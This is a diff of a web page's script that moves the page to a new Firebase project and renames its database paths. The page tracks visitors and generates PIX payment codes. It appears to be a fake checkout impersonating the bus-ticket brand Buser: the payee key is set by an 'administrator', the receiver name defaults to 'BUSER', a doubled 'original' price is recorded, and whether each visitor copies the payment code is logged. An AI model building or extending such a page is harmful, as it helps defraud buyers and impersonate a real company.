@@ -1024,16 +1024,17 @@
 
 <script>
   // ============================================================
-  // FIREBASE (PIX config)
+  // FIREBASE (PIX config) - NOVO PROJETO tela-buser
   // ============================================================
   const firebaseConfig = {
-    apiKey: "AIzaSyCmoxq5NMQUj1hqyWhjaJz4Uw4grhsFFhA",
-    authDomain: "projeto-link-ddbf0.firebaseapp.com",
-    databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
-    projectId: "projeto-link-ddbf0",
-    storageBucket: "projeto-link-ddbf0.firebasestorage.app",
-    messagingSenderId: "560317126646",
-    appId: "1:560317126646:web:be9cad9c9ed350940399d7"
+    apiKey: "AIzaSyAJydedP--aj9JmwO07nvkBo4tbrRgA6Y",
+    authDomain: "tela-buser.firebaseapp.com",
+    databaseURL: "https://tela-buser-default-rtdb.firebaseio.com",
+    projectId: "tela-buser",
+    storageBucket: "tela-buser.firebasestorage.app",
+    messagingSenderId: "195465924963",
+    appId: "1:195465924963:web:9c16c6977b0e8d47168356",
+    measurementId: "G-YHNDQ54ZQ"
   };
   let db = null;
   try {
@@ -1055,13 +1056,13 @@
   if (db) {
     const clienteId = getClienteId();
     const marcarOnline = () => {
-      db.ref('buser_visitas/' + clienteId).update({ ultimaAtividade: firebase.database.ServerValue.TIMESTAMP, online: true }).catch(() => {});
+      db.ref('farol_visitas/' + clienteId).update({ ultimaAtividade: firebase.database.ServerValue.TIMESTAMP, online: true }).catch(() => {});
     };
 
     marcarOnline();
-    db.ref('buser_visitas/' + clienteId + '/primeiraVisita').transaction(val => val || Date.now());
+    db.ref('farol_visitas/' + clienteId + '/primeiraVisita').transaction(val => val || Date.now());
     
-    window.addEventListener('beforeunload', () => { db.ref('buser_visitas/' + clienteId + '/online').set(false).catch(() => {}); });
+    window.addEventListener('beforeunload', () => { db.ref('farol_visitas/' + clienteId + '/online').set(false).catch(() => {}); });
     setInterval(marcarOnline, 20000);
   }
 
@@ -1620,9 +1621,9 @@
   async function gerarPix() {
     try {
       if (!db) throw new Error('Firebase não inicializado');
-      const snap = await db.ref('buser_pix_cfg').once('value');
+      const snap = await db.ref('farol_pix_cfg').once('value');
       const cfg = snap.val() || {};
-      if (!cfg.key) { alert('⚠️ Chave PIX não configurada. Peça ao administrador para configurar em /buser_pix_cfg { key, name, city }.'); return; }
+      if (!cfg.key) { alert('⚠️ Chave PIX não configurada. Peça ao administrador para configurar em /farol_pix_cfg { key, name, city }.'); return; }
 
       const key = String(cfg.key).replace(/\s+/g, '').trim();
       const nome = (cfg.name || 'BUSER').toUpperCase().substring(0, 25);
@@ -1659,7 +1660,7 @@
 
       try {
         const clienteId = getClienteId();
-        await db.ref(`buser_pedidos/${clienteId}/pix/${txid}`).set({
+        await db.ref(`farol_pedidos/${clienteId}/pix/${txid}`).set({
           txid, key, receiverName: nome, amount: total, originalAmount: total * 2,
           route: checkoutState.route, empresa: checkoutState.empresa, poltrona: checkoutState.poltrona,
           status: 'pending', geradoEm: Date.now(), payload,
@@ -1692,7 +1693,7 @@
       try {
         if (db && checkoutState.txid) {
           const clienteId = getClienteId();
-          await db.ref(`buser_pedidos/${clienteId}/pix/${checkoutState.txid}`).update({ copiado: true, copiadoEm: Date.now() });
+          await db.ref(`farol_pedidos/${clienteId}/pix/${checkoutState.txid}`).update({ copiado: true, copiadoEm: Date.now() });
         }
       } catch (e) { console.warn(e); }
     });
@@ -1709,7 +1710,7 @@
 
     if (db && checkoutState.txid) {
       const clienteId = getClienteId();
-      listenerStatusPedido = db.ref(`buser_pedidos/${clienteId}/pix/${checkoutState.txid}`);
+      listenerStatusPedido = db.ref(`farol_pedidos/${clienteId}/pix/${checkoutState.txid}`);
       
       listenerStatusPedido.on('value', (snap) => {
         const dados = snap.val();
